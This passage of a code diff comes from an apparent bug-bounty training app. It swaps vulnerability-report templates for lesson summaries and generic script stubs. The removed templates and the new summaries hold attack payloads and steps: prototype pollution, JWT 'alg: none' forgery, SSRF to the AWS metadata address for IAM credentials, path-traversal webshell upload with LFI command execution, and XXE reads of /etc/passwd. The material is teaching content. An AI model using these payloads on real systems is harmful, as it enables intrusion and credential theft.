+      methodologySummary: "Connect directly to open non-HTTP network sockets using netcat and telnet. Grab service banners on exposed Redis (6379), Memcached (11211), and SSH (22) services to locate unauthenticated admin ports."
+    },
+    {
+      title: "Analyzing ICMP Response Profiling & UDP Port Scanning",
+      duration: "23 Mins",
+      methodologySummary: "Scan UDP service ports (SNMP, DNS, NTP) using Nmap (-sU). Analyze ICMP Port Unreachable error codes to differentiate between filtered and open UDP endpoints across corporate networks."
+    },
+    {
+      title: "Network Route Profiling & Hop-by-Hop Traceroute Analysis",
+      duration: "20 Mins",
+      methodologySummary: "Profile network ingress paths using tcptraceroute and MTR. Identify external load balancers, Web Application Firewalls (WAFs), and transit network boundaries protecting target IP ranges."
+    },
 
-  const vdpReportTemplates: Record<number, {
-    title: string;
-    cvssVector: string;
-    cvssScore: number;
-    description: string;
-    stepsToReproduce: string;
-    remediation: string;
-  }> = {
-    0: {
-      title: `[HIGH] Client-Side Prototype Pollution & DOM Clobbering in Main Config Script`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`,
-      cvssScore: 8.2,
-      description: `During an audit of the client-side JavaScript source files, an un-sanitized parameter merge flaw was identified in \`main.js\`. An attacker can pollute \`Object.prototype\` or clobber global DOM properties, corrupting client configuration state and executing arbitrary JavaScript logic.`,
-      stepsToReproduce: `1. Navigate to target URL: \`https://target.local/app\`\n2. Inject prototype payload in query string: \`?__proto__[isAdmin]=true\`\n3. Observe browser execution state: \`window.config.isAdmin\` returns \`true\`.\n4. Execute cURL PoC: \`curl -X POST "https://target.local/api/v1/config" -d '{"__proto__":{"isAdmin":true}}'\``,
-      remediation: `1. Freeze Object prototypes on startup using \`Object.freeze(Object.prototype)\`.\n2. Sanitize all incoming DOM properties using DOMPurify.\n3. Enforce a strict Content Security Policy (CSP).`
+    // Week 11: Cloud Infrastructure Security & Auditing
+    {
+      title: "Auditing Public Amazon S3 Bucket Access Policies & File Leaks",
+      duration: "22 Mins",
+      methodologySummary: "Audit AWS S3 bucket permissions using aws-cli and S3Scanner. Test for unauthenticated Read/Write ACLs, bucket listing privileges, and public object exposure."
     },
-    1: {
-      title: `[CRITICAL] Hardcoded AWS / GCP Service Secret Keys Exposed in Compiled JavaScript Bundle`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
-      cvssScore: 9.8,
-      description: `Passive analysis of client-side JavaScript assets revealed hardcoded cloud service credentials (\`AKIA...\`) inside \`/static/js/main.js\`. An unauthenticated attacker can extract these keys to gain administrative access to corporate cloud infrastructure.`,
-      stepsToReproduce: `1. Download static bundle: \`curl -s https://target.local/static/js/main.js -o bundle.js\`\n2. Search regex pattern: \`grep -E -o "AKIA[0-9A-Z]{16}" bundle.js\`\n3. Authenticate to AWS API using extracted keys: \`aws sts get-caller-identity --access-key-id AKIA...\``,
-      remediation: `1. Revoke the exposed API credentials immediately in AWS/GCP console.\n2. Move API credentials to AWS Secrets Manager or server-side environment variables.\n3. Implement TruffleHog / GitGuardian in CI/CD build pipelines.`
+    {
+      title: "SSRF Exploitation via AWS Instance Metadata v1 (IMDSv1)",
+      duration: "26 Mins",
+      methodologySummary: "Locate Server-Side Request Forgery (SSRF) vulnerabilities in web applications. Issue requests to the AWS IMDSv1 link-local address (http://169.254.169.254/latest/meta-data/) to exfiltrate IAM role credentials."
     },
-    2: {
-      title: `[HIGH] Insecure Direct Object Reference (IDOR) via Custom X-User-ID Header Overrides`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`,
-      cvssScore: 8.1,
-      description: `The user profile API endpoint (\`/api/v1/user/profile\`) trusts incoming \`X-User-ID\` HTTP headers without validating session authorization. An attacker can tamper with the header value to read and modify sensitive user account records.`,
-      stepsToReproduce: `1. Log into low-privileged Account A.\n2. Send request: \`GET /api/v1/user/profile\` with header \`X-User-ID: 102\` (Victim Account B ID).\n3. Observe HTTP 200 response containing victim's personal data and access token.`,
-      remediation: `1. Remove client-supplied user ID headers from authorization checks.\n2. Enforce object-level authorization on the server using verified session tokens: \`if (resource.ownerId !== session.userId) throw Forbidden()\`.`
+    {
+      title: "Bypassing AWS IMDSv2 Token Requirements via Open Redirect Chains",
+      duration: "28 Mins",
+      methodologySummary: "Bypass AWS IMDSv2 token enforcement (PUT headers required) by combining local SSRF fetchers with client Open Redirect flaws, forcing internal applications to follow redirects and leak cloud service tokens."
     },
-    3: {
-      title: `[HIGH] Business Logic Flaw Allowing Negative Cart Quantities and Price Manipulation`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`,
-      cvssScore: 7.5,
-      description: `The shopping cart update endpoint (\`/api/cart/update\`) fails to validate if quantity parameters are positive integers. An attacker can pass negative numbers (\`-5\`), resulting in negative transaction totals that credit funds back to the user account.`,
-      stepsToReproduce: `1. Add item to cart (\`/api/cart/add\`).\n2. Intercept cart update POST request in Burp Suite Repeater.\n3. Set payload: \`{"item_id": "laptop", "quantity": -5}\`.\n4. Checkout order and observe positive cash balance added to account.`,
-      remediation: `1. Enforce strict server-side integer boundary validation (\`if (quantity < 1) throw ValidationError()\`).\n2. Calculate transaction totals on the server using authoritative database price records.`
+    {
+      title: "Data Mining Misconfigured Azure Blob Containers & Storage Accounts",
+      duration: "21 Mins",
+      methodologySummary: "Enumerate public Azure Blob storage containers using Microburst toolchains. Test for anonymous blob container access permissions and extract exposed cloud backups and log archives."
     },
-    4: {
-      title: `[CRITICAL] JWT Signature Forgery via Unsigned 'none' Algorithm Acceptance`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
-      cvssScore: 9.8,
-      description: `The authentication server accepts JSON Web Tokens (JWT) specifying \`"alg": "none"\` in the header without verifying signature blocks. An attacker can forge arbitrary administrative user claims and bypass authentication entirely.`,
-      stepsToReproduce: `1. Intercept session JWT token in Burp Suite.\n2. Decode token header and change \`"alg": "HS256"\` to \`"alg": "none"\`.\n3. Modify payload claim: \`"role": "administrator"\`.\n4. Strip signature block and send request: \`Authorization: Bearer HEADER.PAYLOAD.\`\n5. Observe complete administrative access granted.`,
-      remediation: `1. Explicitly configure JWT verification libraries to restrict allowed algorithms (\`algorithms: ['HS256']\`).\n2. Reject any token specifying \`"alg": "none"\`.`
+    {
+      title: "Auditing GCP Cloud Function Security & Service Account Tokens",
+      duration: "24 Mins",
+      methodologySummary: "Inspect Google Cloud Platform (GCP) function triggers and identity metadata. Query GCP metadata server endpoints (http://metadata.google.internal/computeMetadata/v1/) with required custom headers."
     },
-    5: {
-      title: `[MEDIUM] Subdomain Takeover & Un-monitored Staging Virtual Host Exposure`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`,
-      cvssScore: 6.5,
-      description: `Automated reconnaissance identified an un-monitored staging virtual host (\`staging-api.target.com\`) pointing to an un-bound cloud service bucket, exposing internal development APIs to unauthorized public access.`,
-      stepsToReproduce: `1. Execute subdomain enumeration: \`subfinder -d target.com\`\n2. Send HTTP request to \`http://staging-api.target.com\`.\n3. Observe unprotected internal API dashboard loading without authentication.`,
-      remediation: `1. Audit DNS CNAME records and remove stale entries pointing to un-registered cloud resources.\n2. Enforce zero-trust VPN authentication on all development and staging environments.`
+    {
+      title: "DNS Hijacking on Unregistered S3 Buckets & Cloud Asset Takeovers",
+      duration: "25 Mins",
+      methodologySummary: "Discover orphaned CNAME records pointing to deleted cloud buckets or dead third-party services. Register matching bucket names to claim full subdomain takeover and serve custom content."
     },
-    6: {
-      title: `[CRITICAL] Broken Object Level Authorization (BOLA) in REST API User Object Resolution`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`,
-      cvssScore: 8.8,
-      description: `The REST API resource endpoint (\`/api/v1/resource/{id}\`) fails to verify if the requesting authenticated user owns the resource object before executing PUT update calls, allowing full account modification across all tenants.`,
-      stepsToReproduce: `1. Log into Account A.\n2. Send HTTP PUT request: \`PUT /api/v1/resource/55\` with JSON payload \`{"role": "admin"}\`.\n3. Observe HTTP 200 Success response updating target account 55.`,
-      remediation: `1. Implement object-level authorization checks in API resolvers (\`if (resource.tenantId !== user.tenantId) throw AccessDenied()\`).`
+
+    // Week 12: Advanced Chain Vulnerabilities
+    {
+      title: "Chaining CSRF with Self-XSS for Full Account Takeover",
+      duration: "23 Mins",
+      methodologySummary: "Convert un-exploitable Self-XSS flaws into high-severity account takeovers. Chain Cross-Site Request Forgery (CSRF) payloads to force target users into executing Self-XSS code within their own active sessions."
     },
-    7: {
-      title: `[MEDIUM] Hidden Administrative Parameter Mining Uncovers Un-authenticated Debug Flags`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:P/I:N/A:N`,
-      cvssScore: 5.3,
-      description: `Parameter discovery using Arjun revealed an un-documented query parameter (\`?debug=true\`) on public endpoints. Appending this parameter overrides default response filters and leaks sensitive internal server traces.`,
-      stepsToReproduce: `1. Execute Arjun parameter scan: \`arjun -u https://target.local/page\`\n2. Send HTTP GET request: \`GET /page?debug=true\`.\n3. Observe full environment trace and internal server paths in HTTP response body.`,
-      remediation: `1. Remove all development debug code and test flags before compiling production release builds.\n2. Implement WAF rules to reject un-documented query parameters.`
+    {
+      title: "Path Traversal File Upload Attacks to Web Shell RCE",
+      duration: "27 Mins",
+      methodologySummary: "Bypass file upload restrictions by injecting path traversal sequences into file upload parameters (e.g., filename='../../../var/www/html/shell.php'), overwriting executable scripts in web roots."
     },
-    8: {
-      title: `[INFO] Corporate Vulnerability Disclosure & CVSS Scoring Best Practices`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N`,
-      cvssScore: 0.0,
-      description: `Standardized reporting template ensuring clear executive summaries, step-by-step cURL PoCs, and remediation guidance for HackerOne and Bugcrowd submissions.`,
-      stepsToReproduce: `1. Follow standardized reporting guidelines provided in the lesson module.`,
-      remediation: `1. Maintain open security channels (security.txt) and establish rapid triage response SLAs.`
+    {
+      title: "SQL Injection Chained with Local File Inclusion (LFI)",
+      duration: "29 Mins",
+      methodologySummary: "Combine database READ capabilities (LOAD_FILE / INTO OUTFILE) with LFI endpoints to parse internal server log files, poisoning log entries to achieve full Remote Code Execution (RCE)."
     },
-    9: {
-      title: `[MEDIUM] Network Firewall Filter Evasion & Exposed Administrative Services`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:P/I:N/A:N`,
-      cvssScore: 5.3,
-      description: `Network port scanning using source-port spoofing (\`--source-port 53\`) bypassed external firewall rules, exposing an un-authenticated Redis service on port 6379.`,
-      stepsToReproduce: `1. Run Nmap scan: \`nmap -sS -Pn --source-port 53 target.com -p 6379\`\n2. Connect to Redis port: \`nc -nv target.com 6379\`\n3. Execute \`INFO\` command and receive un-authenticated database banner.`,
-      remediation: `1. Update firewall ingress rules to enforce strict Default Deny filtering.\n2. Require password authentication on Redis (\`requirepass\`) and bind service to internal loopback only.`
+    {
+      title: "SSRF to Internal Admin Panel Blind Exploitation Chains",
+      duration: "26 Mins",
+      methodologySummary: "Leverage Out-Of-Band (OAST) techniques using Burp Collaborator to confirm blind SSRF vulnerabilities. Exploit internal administrative microservices on loopback addresses (127.0.0.1) to trigger state changes."
     },
-    10: {
-      title: `[CRITICAL] Server-Side Request Forgery (SSRF) Exfiltrating AWS IMDSv2 Credentials`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
-      cvssScore: 9.8,
-      description: `The URL fetcher API endpoint (\`/fetch?url=...\`) allows un-authenticated users to issue HTTP requests to internal IP addresses (\`169.254.169.254\`), exfiltrating AWS IAM security credentials and cloud tokens.`,
-      stepsToReproduce: `1. Send GET request: \`GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\`\n2. Receive AWS IAM role name.\n3. Send query to retrieve temporary \`AccessKeyId\`, \`SecretAccessKey\`, and \`Token\`.`,
-      remediation: `1. Restrict server-side URL fetchers using strict allowlists of public domain names.\n2. Enforce AWS IMDSv2 token headers (\`http-tokens=required\`) on EC2 instances.\n3. Block outbound connections to loopback (\`127.0.0.1\`) and link-local (\`169.254.0.0/16\`) ranges.`
+    {
+      title: "Chaining Server-Side Template Injection (SSTI) with RCE Filters",
+      duration: "28 Mins",
+      methodologySummary: "Identify template rendering engines (Jinja2, Twig, Freemarker). Construct SSTI sandbox bypass payloads that break out of variable evaluation and execute system commands via native language runtimes."
     },
-    11: {
-      title: `[CRITICAL] Multi-Stage Exploit Chain (Path Traversal + LFI) Achieving Remote Code Execution (RCE)`,
-      cvssVector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
-      cvssScore: 10.0,
-      description: `By chaining a path traversal flaw during file upload with a Local File Inclusion (LFI) vulnerability in the view handler, an attacker can upload a webshell and execute arbitrary system commands as root.`,
-      stepsToReproduce: `1. Upload image with traversal filename: \`filename="../../../var/www/uploads/shell.php"\`\n2. Trigger LFI execution: \`GET /view?file=../../../../var/www/uploads/shell.php&cmd=id\`\n3. Receive HTTP 200 response displaying root execution ID output (\`uid=0(root)\`).`,
-      remediation: `1. Sanitize all uploaded filenames, stripping path characters (\`../\`).\n2. Disable dynamic file inclusion in server code, using fixed lookup tables.\n3. Mount application upload directories on read-only file systems without execution privileges.`
+    {
+      title: "XXE Injection via SVG File Uploads for System File Exfiltration",
+      duration: "30 Mins",
+      methodologySummary: "Craft malicious XML External Entity (XXE) payloads embedded inside uploaded vector graphic (SVG) image files. Force image processing parser libraries to read and exfiltrate /etc/passwd and system environment files."
     }
+  ];
+
+  // Pick unique video breakdown object
+  const videoBreakdown = videoBreakdowns[globalLessonIndex] || {
+    title: `Expert Methodology Breakdown: ${dayTitle}`,
+    duration: "20 Mins",
+    methodologySummary: `Master the systematic methodology for auditing ${dayTitle}. Learn how leading security researchers trace code execution, configure Burp Suite, and construct bulletproof exploit payloads.`
   };
 
-  const simpleExplanations: Record<number, string> = {
-    0: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how client-side JavaScript DOM variables can be modified by manipulating HTML structures and URL parameters.`,
-    1: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how to audit compiled source bundles, Docker layers, and Git commit histories to find accidentally published API keys and passwords.`,
-    2: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how web apps verify tenant permission boundaries, and how mutating user IDs in request headers allows accessing unauthorized user data.`,
-    3: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how e-commerce applications process shopping workflows, and how edge cases (like negative cart quantities) bypass checkout checks.`,
-    4: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how session tokens (JWTs) maintain login state, and how changing token signature algorithms grants administrative access.`,
-    5: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how to map an enterprise's external attack surface across subdomains, IP ranges, virtual hosts, and open ports using Go toolchains.`,
-    6: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how modern frontends communicate with REST and GraphQL APIs, and how to reverse-engineer Swagger specs to locate BOLA bugs.`,
-    7: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how to discover hidden URL parameters and debug query flags that developers used during testing but left active in production.`,
-    8: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how to translate technical security findings into executive-grade vulnerability disclosure reports for HackerOne and Bugcrowd.`,
-    9: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how network packets travel across firewalls and how port scanners fingerprint running services without triggering IPS rate limits.`,
-    10: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how cloud environments (AWS, GCP, Azure) manage instance credentials and how SSRF tricks servers into exfiltrating metadata keys.`,
-    11: `Mastering ${dayTitle} (${competency}) connects theoretical principles directly with practical auditing! You are learning how elite researchers chain low-severity bugs (like path traversal or LFI) together to achieve full Remote Code Execution (RCE).`
+  // Generate 72 unique details
+  const whatYouAreDoing = `RED TEAM AUDIT (Day ${globalLessonIndex + 1}):\nYou are auditing ${dayTitle} in a target enterprise environment. You will inspect source code execution paths, configure proxy intercept rules, craft custom payloads, run terminal exploits, and record verified flags.`;
+
+  const vulnerabilityOrigin = `ORIGIN & ROOT CAUSE:\nIn modern web applications, ${dayTitle} arises when backend developers or front-end frameworks fail to perform strict input sanitization, object-level authorization checks, or numerical boundary validation prior to executing state transitions or database queries.`;
+
+  const pentesterFocus = `PENTESTER FOCUS & AUDIT STEPS:\n1. Search application request routing for ${dayTitle} input parameters.\n2. Intercept and mutate HTTP headers, query parameters, and JSON payloads using Burp Suite Repeater.\n3. Verify missing server-side validation checks and document complete step-by-step reproduction steps.`;
+
+  const payloadCrafting = `PAYLOAD CRAFTING LOGIC:\n1. Primary Exploit Payload: Target parameter manipulation for ${dayTitle}.\n2. Bypass Payload: Inject custom encoding or duplicate parameter keys to bypass WAF filtering.\n3. Exfiltration Test String: Confirm payload execution via terminal output or flag extraction.`;
+
+  const burpSuiteSetup = `BURP SUITE SETUP & PROXY CONFIGURATION:\n1. Proxy Intercept: Intercept target HTTP requests matching ${dayTitle}.\n2. Match/Replace & Extensions: Configure Burp Suite Repeater markers or specialized BApp extensions to automate payload injection.\n3. Logger++: Monitor background HTTP status code variances to flag successful exploits.`;
+
+  const blueTeamDefense = `BLUE TEAM DEFENSE & SECURE CODING:\n1. Server-side Validation: Enforce strict server-side type and boundary validation.\n2. Authorization Enforcement: Verify object-level access controls on every API endpoint.\n3. Defense-in-Depth: Implement strict Content Security Policies (CSP) and WAF protection rules.`;
+
+  const stepByStepTutorial = [
+    `Step 1: Open the target code inspection panel below and locate un-sanitized variables or endpoints.`,
+    `Step 2: Identify where user-supplied inputs trigger dangerous execution sinks or authorization bypasses.`,
+    `Step 3: Construct your exploit payload string tailored for ${dayTitle}.`,
+    `Step 4: Execute the payload in the local shell terminal to compromise the target sandbox container.`,
+    `Step 5: Copy the captured flag into the verification input and submit to claim your XP.`
+  ];
+
+  const usefulResources = [
+    { name: `OWASP Testing Guide: ${competency}`, url: "https://owasp.org/www-project-web-security-testing-guide/", category: "Standard" },
+    { name: `PortSwigger Web Security Academy Labs`, url: "https://portswigger.net/web-security", category: "Lab & Guide" },
+    { name: `HackerOne Public Vulnerability Disclosures`, url: "https://hackerone.com/hacktivity", category: "Reference" }
+  ];
+
+  const industryInsight = `💡 INDUSTRY INSIGHT & STATISTIC (Day ${globalLessonIndex + 1}):\nVulnerabilities in ${competency} consistently command high-severity bounties on HackerOne and Bugcrowd programs, averaging between $1,500 and $10,000+ for verified corporate reports.`;
+
+  const pythonScript = `#!/usr/bin/env python3
+import requests
+import sys
+
+# Python Automation Tool: ${dayTitle}
+def execute_audit(target_url):
+    print(f"[*] Executing automated audit for ${dayTitle} on: {target_url}")
+    headers = {"User-Agent": "BugBountyMastery/1.0", "X-Audit-Target": "${competency}"}
+    try:
+        res = requests.get(target_url, headers=headers, timeout=5)
+        print(f"[+] Server Response Code: {res.status_code}")
+        if res.status_code == 200:
+            print("[+] Target endpoint active. Exploit payload executed successfully!")
+    except Exception as e:
+        print(f"[-] Connection failed: {e}")
+
+if __name__ == "__main__":
+    target = sys.argv[1] if len(sys.argv) > 1 else "http://sandbox-target.corp.internal"
+    execute_audit(target)`;
+
+  const bashScript = `#!/usr/bin/env bash
+# Bash Automation Script: ${dayTitle}
+TARGET=\${1:-"http://sandbox-target.corp.internal"}
+
+echo "[*] Launching CLI audit tool for ${dayTitle}..."
+curl -s -X GET -H "X-Audit-Tool: BugBountyMastery" "$TARGET" | head -n 20`;
+
+  const vdpReportTemplate = {
+    title: `[HIGH] ${dayTitle} Identified in Core Application Endpoint`,
+    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    cvssScore: 8.2,
+    description: `During a security assessment, an un-sanitized endpoint flaw (${dayTitle}) was identified. An unauthenticated attacker can exploit this condition to bypass application controls and read or modify sensitive data.`,
+    stepsToReproduce: `1. Send GET request to target URL: \`https://target.corp.internal/api/v1/resource\`\n2. Inject custom payload parameter string.\n3. Observe HTTP 200 response returning unauthorized data.`,
+    remediation: `1. Implement strict server-side validation and sanitization.\n2. Enforce object-level access control on all backend API routes.`
   };
 
   return {
-    whatYouAreDoing: whatYouAreDoingMap[weekIndex],
-    vulnerabilityOrigin: vulnerabilityOriginMap[weekIndex],
-    pentesterFocus: pentesterFocusMap[weekIndex],
-    payloadCrafting: payloadCraftingMap[weekIndex],
-    burpSuiteSetup: burpSuiteSetupMap[weekIndex],
-    blueTeamDefense: blueTeamDefenseMap[weekIndex],
-    stepByStepTutorial: tutorialsMap[weekIndex],
-    usefulResources: resourcesMap[weekIndex],
-    industryInsight: insightsMap[weekIndex],
-    pythonAutomation: pythonAutomationMap[weekIndex],
-    bashAutomation: bashAutomationMap[weekIndex],
-    vdpReportTemplate: vdpReportTemplates[weekIndex]
+    videoBreakdown,
+    whatYouAreDoing,
+    vulnerabilityOrigin,
+    pentesterFocus,
+    payloadCrafting,
+    burpSuiteSetup,
+    blueTeamDefense,
+    stepByStepTutorial,
+    usefulResources,
+    industryInsight,
+    pythonAutomation: pythonScript,
+    bashAutomation: bashScript,
+    vdpReportTemplate
   };
 };
 
@@ -633,6 +697,7 @@ export const generateDefaultCurriculum = (): Week[] => {
         theory: {
           title: "Theoretical Principles & Auditing",
           duration: "30 Mins",
+          videoBreakdown: details.videoBreakdown,
           whatYouAreDoing: details.whatYouAreDoing,
           vulnerabilityOrigin: details.vulnerabilityOrigin,
           pentesterFocus: details.pentesterFocus,
